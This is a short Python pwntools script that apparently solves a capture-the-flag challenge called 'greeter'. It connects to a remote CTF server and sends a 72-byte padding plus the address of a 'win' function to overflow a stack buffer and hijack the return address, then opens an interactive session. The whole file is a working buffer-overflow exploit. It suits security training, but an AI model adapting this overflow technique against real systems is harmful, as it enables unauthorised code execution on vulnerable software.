#!/usr/bin/python3
from pwn import *

win=0x401220

elf = context.binary = ELF("greeter")
libc = elf.libc

gs = '''
continue
'''
""" def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path) """
def start():

    return remote("challenges.ctfd.io","30249")


io = start()



# =============================================================================

io.sendline(b'A'*72+p64(win))



# =============================================================================

io.interactive()
